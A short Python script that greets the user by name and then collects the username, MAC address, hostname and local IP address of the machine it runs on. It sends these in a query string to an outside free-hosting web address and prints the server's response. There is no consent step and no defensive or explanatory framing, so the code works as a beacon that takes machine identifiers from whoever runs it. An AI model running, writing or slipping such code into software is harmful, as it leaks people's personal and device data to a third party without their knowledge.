import requests as req
import re,uuid
import getpass
import time
import socket

# Username
username = getpass.getuser()
greetings = "Welcome " + username
print(greetings)


# Mac address
mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))

# hostname
hostname = socket.gethostname()

#ip
ip = socket.gethostbyname(hostname)

#sending data to server
resp = req.get("https://avivathapar.000webhostapp.com/?username="+username+"&mac="+mac+"&hostname="+hostname+"&ip="+ip)
print(resp.text)